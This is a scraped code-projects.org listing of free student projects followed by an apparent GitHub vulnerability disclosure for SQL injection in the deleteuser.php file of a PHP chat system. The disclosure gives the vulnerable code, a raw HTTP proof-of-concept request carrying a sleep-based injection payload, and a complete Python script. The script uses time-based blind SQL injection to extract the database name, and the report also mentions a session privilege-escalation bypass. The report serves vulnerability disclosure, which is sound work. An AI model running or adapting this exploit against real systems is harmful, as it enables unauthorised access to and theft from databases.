=== Content from code-projects.org_36db8cd3_20250114_203422.html ===

[Skip to content](#content "Skip to content")
[Source Code & Projects](https://code-projects.org/)

* [Home](https://code-projects.org/)
* [Languages](https://code-projects.org/c/languages/)Menu Toggle

  + [PHP](https://code-projects.org/c/languages/project/phpprojects/)
  + [Laravel Projects](https://code-projects.org/c/languages/project/phpprojects/laravel-project/)
  + [C/C++](https://code-projects.org/c/languages/project/ccprojects/)Menu Toggle

    - [C projects](https://code-projects.org/c/languages/project/cprojects/)
    - [C++ Projects](https://code-projects.org/c/languages/project/cplusplusprojects/)
  + [Java](https://code-projects.org/c/languages/project/javaprojects/)
  + [JavaScript](https://code-projects.org/c/languages/project/jsprojects/)
  + [VB.Net](https://code-projects.org/c/languages/project/dotnet/)
  + [C#](https://code-projects.org/c/languages/project/c-sharp-projects/)
  + [Python](https://code-projects.org/c/languages/project/pythonprojects/)
  + [Django](https://code-projects.org/c/python/django-projects/)
  + [Swift](https://code-projects.org/c/languages/project/swift-projects/)
* [App Projects](https://code-projects.org/c/app-projects/)Menu Toggle

  + [Unity Projects](https://code-projects.org/c/app-projects/unity-projects/)
  + [Android Projects](https://code-projects.org/c/app-projects/android-projects/)
* [Premium Projects](https://code-projects.org/c/premium-projects/)

[Source Code & Projects](https://code-projects.org/)

Main Menu

* [Cart](https://code-projects.org/cart/)
* [Checkout](https://code-projects.org/checkout/)
* [Checkout-Result](https://code-projects.org/stripe-checkout-result/)
* [Contact Us](https://code-projects.org/contact-us/)
* [EPS Test](https://code-projects.org/eps-test/)
* [My account](https://code-projects.org/my-account/)
* [Newsletter](https://code-projects.org/newsletter/)
* [Privacy Policy](https://code-projects.org/privacy-policy/)
* [Products](https://code-projects.org/products/)
* [Refund Policy Template for Digital Products](https://code-projects.org/refund-policy-template-for-digital-products/)
* [Shop](https://code-projects.org/shop/)
* [Terms of Service](https://code-projects.org/terms-of-service/)
* [Typography](https://code-projects.org/typography/)

[![](https://code-projects.org/wp-content/uploads/2018/02/Screenshot-2434000.png)](https://code-projects.org/police-fir-record-management-system-c-programming-source-code/)[C projects](https://code-projects.org/c/languages/project/cprojects/), [C/C++ Projects](https://code-projects.org/c/languages/project/ccprojects/), [Project](https://code-projects.org/c/languages/project/)
## [Police FIR Record Management System In C Programming With Source Code](https://code-projects.org/police-fir-record-management-system-c-programming-source-code/)

 [Fabian Ros](https://code-projects.org/author/fabian/ "View all posts by Fabian Ros")

/  January 14, 2025

Project: Police FIR Record Management System – To download it for free (scroll down) This system is based on a […]

[![](https://code-projects.org/wp-content/uploads/2018/02/Screenshot-2386000.png)](https://code-projects.org/media-player-vb-net-source-code/)[Project](https://code-projects.org/c/languages/project/), [VB.Net Projects](https://code-projects.org/c/languages/project/dotnet/)
## [Media Player In VB.NET With Source Code](https://code-projects.org/media-player-vb-net-source-code/)

 [Fabian Ros](https://code-projects.org/author/fabian/ "View all posts by Fabian Ros")

/  January 14, 2025

Project: Media Player – To download it for free (scroll down) The project is developed using VB.NET. This program works

[![](https://code-projects.org/wp-content/uploads/2018/02/Screenshot-2308000.png)](https://code-projects.org/domain-checker-pinger-vb-net-source-code/)[Project](https://code-projects.org/c/languages/project/), [VB.Net Projects](https://code-projects.org/c/languages/project/dotnet/)
## [Domain Checker + Pinger In VB.NET With Source Code](https://code-projects.org/domain-checker-pinger-vb-net-source-code/)

 [Fabian Ros](https://code-projects.org/author/fabian/ "View all posts by Fabian Ros")

/  January 13, 2025

Project: Domain Checker + Pinger – To download it for free (scroll down) The project is developed using VB.NET. This

[![](https://code-projects.org/wp-content/uploads/2018/02/Screenshot-229700.png)](https://code-projects.org/student-grading-system-c-source-code/)[C# Projects](https://code-projects.org/c/languages/project/c-sharp-projects/), [Project](https://code-projects.org/c/languages/project/)
## [Student Grading System In C# With Source Code](https://code-projects.org/student-grading-system-c-source-code/)

 [Fabian Ros](https://code-projects.org/author/fabian/ "View all posts by Fabian Ros")

/  January 13, 2025

Project : Student Grading System – To download it for free (scroll down) This system is developed using C# Language.

[![](https://code-projects.org/wp-content/uploads/2018/02/Screenshot-2286000-1.png)](https://code-projects.org/simple-book-shop-management-system-vb-net-source-code/)[Project](https://code-projects.org/c/languages/project/), [VB.Net Projects](https://code-projects.org/c/languages/project/dotnet/)
## [Simple Book Shop Management System In VB.NET With Source Code](https://code-projects.org/simple-book-shop-management-system-vb-net-source-code/)

 [Fabian Ros](https://code-projects.org/author/fabian/ "View all posts by Fabian Ros")

/  January 12, 2025

Project : Book Shop Management System v.1 – To download it for free (scroll down) This simple project is developed

[![](https://code-projects.org/wp-content/uploads/2018/02/Screenshot-2271000.png)](https://code-projects.org/workplace-contact-management-system-vb-net-source-code/)[Project](https://code-projects.org/c/languages/project/), [VB.Net Projects](https://code-projects.org/c/languages/project/dotnet/)
## [Workplace Contact Management System In VB.NET With Source Code](https://code-projects.org/workplace-contact-management-system-vb-net-source-code/)

 [Fabian Ros](https://code-projects.org/author/fabian/ "View all posts by Fabian Ros")

/  January 12, 2025

Project : Workplace Contact Management System – To download it for free (scroll down) This system is developed using VB.NET.

[![](https://code-projects.org/wp-content/uploads/2018/02/Hindi_Support_Antergos_Arch_linux_10.jpg)](https://code-projects.org/install-hindi-fonts-arch-linux/)[How To ?](https://code-projects.org/c/howto/)
## [How To Install Hindi Fonts In Arch Linux](https://code-projects.org/install-hindi-fonts-arch-linux/)

 [codeprojects](https://code-projects.org/author/codeprojects/ "View all posts by codeprojects")

/  January 11, 2025

You might be noticed when you install fresh Arch Linux or any arch based distribution, Hindi and other Devanagari fonts will

[![](https://code-projects.org/wp-content/uploads/2018/02/Screenshot-225900.png)](https://code-projects.org/gmail-sender-vb-net-source-code/)[Project](https://code-projects.org/c/languages/project/), [VB.Net Projects](https://code-projects.org/c/languages/project/dotnet/)
## [GMAIL Sender In VB.NET With Source Code](https://code-projects.org/gmail-sender-vb-net-source-code/)

 [Fabian Ros](https://code-projects.org/author/fabian/ "View all posts by Fabian Ros")

/  January 11, 2025

Project : Gmail Sender – To download it for free (scroll down) This essential computer application is developed using VB.NET.

[![](https://code-projects.org/wp-content/uploads/2018/02/Screenshot-2252-2.png)](https://code-projects.org/notepad-vb-net-source-code/)[Project](https://code-projects.org/c/languages/project/), [VB.Net Projects](https://code-projects.org/c/languages/project/dotnet/)
## [Notepad In VB.NET With Source Code](https://code-projects.org/notepad-vb-net-source-code/)

 [Fabian Ros](https://code-projects.org/author/fabian/ "View all posts by Fabian Ros")

/  January 10, 2025

Project : Notepad (Metro-Styled) – To download it for free (scroll down) This computer application is developed using VB.NET. User

[![](https://code-projects.org/wp-content/uploads/2018/02/Screenshot-2209000.png)](https://code-projects.org/student-grade-report-system-c-source-code/)[C/C++ Projects](https://code-projects.org/c/languages/project/ccprojects/), [C++ Projects](https://code-projects.org/c/languages/project/cplusplusprojects/), [Project](https://code-projects.org/c/languages/project/)
## [Student Grade Report System In C++ With Source Code](https://code-projects.org/student-grade-report-system-c-source-code/)

 [Fabian Ros](https://code-projects.org/author/fabian/ "View all posts by Fabian Ros")

/  January 10, 2025

Project : Student Grade Report System – To download it for free (scroll down) This whole system is based on

[![](https://code-projects.org/wp-content/uploads/2018/02/Screenshot-22400000.png)](https://code-projects.org/train-ticket-reservation-system-c-programming-source-code/)[C projects](https://code-projects.org/c/languages/project/cprojects/), [C/C++ Projects](https://code-projects.org/c/languages/project/ccprojects/), [Project](https://code-projects.org/c/languages/project/)
## [Train Ticket Reservation System In C Programming With Source Code](https://code-projects.org/train-ticket-reservation-system-c-programming-source-code/)

 [Fabian Ros](https://code-projects.org/author/fabian/ "View all posts by Fabian Ros")

/  January 9, 2025

Project : Train Ticket Reservation System – To download it for free (scroll down) This whole system is based on

Post pagination
1
[2](https://code-projects.org/page/2/)
…
[185](https://code-projects.org/page/185/)
[Next →](https://code-projects.org/page/2/)

Copyright © 2025 Source Code & Projects | Powered by [Astra WordPress Theme](https://wpastra.com/)

 Scroll to Top



=== Content from github.com_2ca4c19f_20250114_203422.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FSinon2003%2Fcve%2Fblob%2Fmain%2Fsql_inject1.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FSinon2003%2Fcve%2Fblob%2Fmain%2Fsql_inject1.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Sinon2003%2Fcve)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Sinon2003](/Sinon2003)
/
**[cve](/Sinon2003/cve)**
Public

* [Notifications](/login?return_to=%2FSinon2003%2Fcve) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FSinon2003%2Fcve)
* [Star
   0](/login?return_to=%2FSinon2003%2Fcve)

* [Code](/Sinon2003/cve)
* [Issues
  0](/Sinon2003/cve/issues)
* [Pull requests
  0](/Sinon2003/cve/pulls)
* [Actions](/Sinon2003/cve/actions)
* [Projects
  0](/Sinon2003/cve/projects)
* [Security](/Sinon2003/cve/security)
* [Insights](/Sinon2003/cve/pulse)

Additional navigation options

* [Code](/Sinon2003/cve)
* [Issues](/Sinon2003/cve/issues)
* [Pull requests](/Sinon2003/cve/pulls)
* [Actions](/Sinon2003/cve/actions)
* [Projects](/Sinon2003/cve/projects)
* [Security](/Sinon2003/cve/security)
* [Insights](/Sinon2003/cve/pulse)

## Files

 main
## Breadcrumbs

1. [cve](/Sinon2003/cve/tree/main)
/
# sql\_inject1.md

Copy path Blame  Blame
## Latest commit

## History

[History](/Sinon2003/cve/commits/main/sql_inject1.md)236 lines (167 loc) · 6.7 KB main
## Breadcrumbs

1. [cve](/Sinon2003/cve/tree/main)
/
# sql\_inject1.md

Top
## File metadata and controls

* Preview
* Code
* Blame

236 lines (167 loc) · 6.7 KB[Raw](https://github.com/Sinon2003/cve/raw/refs/heads/main/sql_inject1.md)
# chat system has sql injection in deleteuser.php

## supplier

<https://code-projects.org/chat-system-using-php-source-code/>

## Vulnerability file

deleteuser.php

## describe

Because the id parameter is not sanitized or parameterized, an attacker can inject malicious SQL code to manipulate the database query. By leveraging time-based SQL injection techniques, an attacker can induce deliberate delays in the database response using functions like SLEEP(). This can be used to confirm the presence of the vulnerability and potentially extract sensitive information from the database.

## **Code analysis**

```
<?php
	include('session.php');
	if(isset($_POST['del'])){
		$id=$_POST['id'];

		mysqli_query($conn,"delete from `user` where userid='$id'");
	}

?>
```

Inserting $\_POST['id'] into Mysql without any filter. A time-based blind SQL injection can be triggered.

There is also a **session** privilege escalation vulnerability, which can be exploited to **bypass** the **session** checks for admin functionalities as a regular user.

## POC

```
POST /admin/deleteuser.php HTTP/1.1
Host: 127.0.0.1:88
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 28
Origin: http://127.0.0.1:88
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://127.0.0.1:88/admin/user.php
Cookie: PHPSESSID=b5htgkjnhs0etvlaida5e47sjq
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

id=3' or sleep(5) #&del=1
```

Send this request, you can observe an additional 5-second time delay triggered by the time-based injection.

## Exploit

To retrieve the current database name.

```
import requests
import string
import time
import logging

# Configuration
TARGET_URL = "http://127.0.0.1:88/admin/deleteuser.php"  # URL
SESSION_COOKIE = "PHPSESSID=b5htgkjnhs0etvlaida5e47sjq"  # session ID
DELAY_TIME = 3  # sleep_time
TIME_THRESHOLD = 2.5  # The threshold for determining the delay
MAX_DB_NAME_LENGTH = 32  # The maximum expected length of the database name
CHARSET = ''.join([chr(i) for i in range(32, 127)])  # all ASCII

# log
logging.basicConfig(filename='sql_injection.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Headers
HEADERS = {
    "Host": "127.0.0.1:88",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Accept": "*/*",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://127.0.0.1:88",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "keep-alive",
    "Referer": "http://127.0.0.1:88/admin/user.php",
    "Cookie": SESSION_COOKIE,
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Priority": "u=0",
}

# Function to send payload and measure response time with retry mechanism
def send_payload(payload, retries=3):
    data = {
        "id": payload,
        "del": "1"
    }
    for attempt in range(retries):
        start_time = time.time()
        try:
            response = requests.post(TARGET_URL, headers=HEADERS, data=data, timeout=DELAY_TIME + 5)
            end_time = time.time()
            elapsed = end_time - start_time
            logging.info(f"Payload: {payload} | Response Time: {elapsed:.2f}s")
            print(f"[>] Payload: {payload} | Response Time: {elapsed:.2f}s")
            return elapsed
        except requests.exceptions.Timeout:
            logging.warning(f"Payload caused timeout: {payload} (Attempt {attempt + 1}/{retries})")
            print(f"[!] Payload caused timeout: {payload} (Attempt {attempt + 1}/{retries})")
            if attempt == retries - 1:
                return DELAY_TIME + 1
    return DELAY_TIME + 1

# Function to check if a condition is true based on response delay using IF
def is_condition_true(condition):
    payload = f"3' OR IF({condition}, SLEEP({DELAY_TIME}), 0) #"
    response_time = send_payload(payload)
    return response_time >= TIME_THRESHOLD

# Function to test basic SLEEP injection
def test_sleep():
    payload = "3' OR IF(1=1, SLEEP(3), 0) #"
    print("[*] Testing basic IF(SLEEP) injection...")
    response_time = send_payload(payload)
    if response_time >= DELAY_TIME:
        print("[+] Basic IF(SLEEP) injection works.")
        return True
    else:
        print("[-] Basic IF(SLEEP) injection failed.")
        return False

# Function to determine the length of the database name
def get_db_name_length():
    length = 0
    while length < MAX_DB_NAME_LENGTH:
        condition = f"CHAR_LENGTH(database()) > {length}"
        if is_condition_true(condition):
            length += 1
            print(f"[*] CHAR_LENGTH(database()) > {length - 1} is True")
        else:
            break
    return length

# Function to get a single character at a specific position using binary search
def get_db_char(position):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        condition = f"ASCII(SUBSTRING(database(),{position},1)) > {mid}"
        if is_condition_true(condition):
            low = mid + 1
        else:
            high = mid - 1
    if 32 <= low <= 126:
        return chr(low)
    return None

# Main function to extract the database name
def extract_database_name():
    print("[*] Starting Time-Based Blind SQL Injection to extract database name...")

    # Test basic SLEEP injection
    if not test_sleep():
        print("[-] Basic SLEEP injection failed. Aborting further tests.")
        return

    # Proceed with extracting database name
    db_length = get_db_name_length()
    print(f"[*] Detected database name length: {db_length}")
    db_name = ""
    for position in range(1, db_length + 1):
        char = get_db_char(position)
        if char:
            db_name += char
            print(f"[+] Position {position}: '{char}'")
        else:
            print(f"[-] Failed to determine character at position {position}")
            break
    print(f"\n[+] Extracted Database Name: {db_name}")

if __name__ == "__main__":
    extract_database_name()
```

**Result**

[![sql-inject1](/Sinon2003/cve/raw/main/assest/sql-inject1.png)](/Sinon2003/cve/blob/main/assest/sql-inject1.png)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


